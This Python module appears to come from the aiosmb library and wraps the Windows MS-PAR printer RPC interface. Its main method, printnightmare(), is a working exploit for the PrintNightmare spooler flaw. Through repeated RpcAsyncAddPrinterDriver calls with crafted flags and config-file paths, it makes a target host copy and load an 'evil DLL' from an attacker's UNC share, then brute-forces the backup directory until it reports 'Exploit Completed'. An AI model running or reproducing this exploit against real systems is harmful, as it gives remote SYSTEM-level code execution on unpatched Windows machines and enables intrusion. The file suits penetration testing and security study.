import traceback
from aiosmb.dcerpc.v5.common.connection.smbdcefactory import SMBDCEFactory
from aiosmb.dcerpc.v5 import par
from aiosmb.dcerpc.v5.dtypes import RPC_SID
from aiosmb.wintypes.ntstatus import NTStatus
from aiosmb import logger
from aiosmb.dcerpc.v5.dtypes import NULL
from aiosmb.commons.utils.decorators import red, rr, red_gen
from aiosmb.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_INTEGRITY, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, DCERPCException, RPC_C_AUTHN_GSS_NEGOTIATE
from aiosmb.dcerpc.v5.interfaces.endpointmgr import EPM

import pathlib

class SMBPAR:
	def __init__(self, connection):
		self.connection = connection
		self.service_manager = None
		
		self.dce = None
		#self.handle = None
		
		self.handle_ctr = 0
		self.printer_handles = {}
		
	async def __aenter__(self):
		return self
		
	async def __aexit__(self, exc_type, exc, traceback):
		await self.close()
		return True,None
	
	async def connect(self, open = False):
		try:
			epm = EPM(self.connection, protocol = 'ncacn_ip_tcp')
			_, err = await epm.connect()
			if err is not None:
				raise err
			stringBinding, _ = await epm.map(par.MSRPC_UUID_PAR)
			self.dce = epm.get_connection_from_stringbinding(stringBinding)

			#the line below must be set!
			self.dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)

			_, err = await self.dce.connect()
			if err is not None:
				raise err

			if open == True:
				_, err = await self.open()
				if err is not None:
					raise err
			return True, None
		except Exception as e:
			return False, e
		finally:
			if epm is not None:
				await epm.disconnect()

	async def open(self):
		if self.dce is None:
			_, err = await self.dce.connect()
			if err is not None:
				return None, err
		_, err = await self.dce.bind(par.MSRPC_UUID_PAR, transfer_syntax = ('8A885D04-1CEB-11C9-9FE8-08002B104860', '2.0'))
		if err is not None:
			return None, err

		return True,None
	
	@red
	async def close(self):
		if self.dce:
			try:
				await self.dce.disconnect()
			except:
				pass
			return
		
		return True,None
	
	async def enum_drivers(self, environments, level = 2, name = ''):
		if environments[-1] != '\x00':
			environments += '\x00'
		drivers, err = await par.hRpcAsyncEnumPrinterDrivers(self.dce, name, environments, level)
		if err is not None:
			return None, err
		return drivers, None
	
	async def get_driverpath(self, environments = "Windows x64"):
		drivers, err = await self.enum_drivers(environments, level = 2)
		if err is not None:
			return None, err
		
		for driver in drivers:
			DriverPath = str(pathlib.PureWindowsPath(driver.DriverPath).parent) + '\\UNIDRV.DLL'
			if "FileRepository" in DriverPath:
				return DriverPath, None

		return None, Exception('Failed to obtain driverpath')


	async def printnightmare(self, share, driverpath = None, handle=NULL, environments = "Windows x64", name = "1234", silent = False):
		try:
			# share needs to be in UNC format! (\\\\10.0.0.1\\share\\...)
			if driverpath is None:
				driverpath, err = await self.get_driverpath(environments = environments)
				if err is not None:
					return None, err
			if driverpath[-1] != '\x00':
				driverpath += '\x00'
			if environments[-1] != '\x00':
				environments += '\x00'
			if name[-1] != '\x00':
				name += '\x00'
			if share[-1] != '\x00':
				share += '\x00'

			container_info = par.DRIVER_CONTAINER()
			container_info['Level'] = 2
			container_info['DriverInfo']['tag'] = 2
			container_info['DriverInfo']['Level2']['cVersion']     = 3
			container_info['DriverInfo']['Level2']['pName']        = name
			container_info['DriverInfo']['Level2']['pEnvironment'] = environments
			container_info['DriverInfo']['Level2']['pDriverPath']  = driverpath
			container_info['DriverInfo']['Level2']['pDataFile']    = share
			container_info['DriverInfo']['Level2']['pConfigFile']  = "C:\\Windows\\System32\\winhttp.dll\x00"

			flags = par.APD_COPY_ALL_FILES | 0x10 | 0x8000
			filename = share.split("\\")[-1]

			#### Triggering the download of the evil DLL
			resp, err = await par.hRpcAsyncAddPrinterDriver(self.dce, pName=handle, pDriverContainer=container_info, dwFileCopyFlags=flags)
			if err is not None:
				raise err
			if silent is False:
				print("[*] Stage 0: {0}".format(resp['ErrorCode']))

			#### Triggering a change in the new printer's config which automatically creates a backup of the evil DLL
			container_info['DriverInfo']['Level2']['pConfigFile'] = "C:\\Windows\\System32\\kernelbase.dll\x00"
			resp, err = await par.hRpcAsyncAddPrinterDriver(self.dce, pName=handle, pDriverContainer=container_info, dwFileCopyFlags=flags)
			if err is not None:
				raise err
			if silent is False:
				print("[*] Stage 1: {0}".format(resp['ErrorCode']))

			##### Triggering the DLL load of the backup version of evil DLL. We first need to find the correct directory...
			for i in range(1, 30):
				try:
					container_info['DriverInfo']['Level2']['pConfigFile'] = "C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\{0}\\{1}\x00".format(i, filename)
					resp, err = await par.hRpcAsyncAddPrinterDriver(self.dce, pName=handle, pDriverContainer=container_info, dwFileCopyFlags=flags)
					if err is not None:
						raise err
					if silent is False:
						print("[*] Stage {0}: {1}".format(i+1, resp['ErrorCode']))
					if (resp['ErrorCode'] == 0):
						if silent is False:
							print("[+] Exploit Completed")
						return True, None
				except Exception as e:
					if silent is False:
						print("[*] Stage %s: %s" % (i+1, e))
					continue

			return False, None
		except Exception as e:
			if silent is False:
				traceback.print_exc()
			return None, e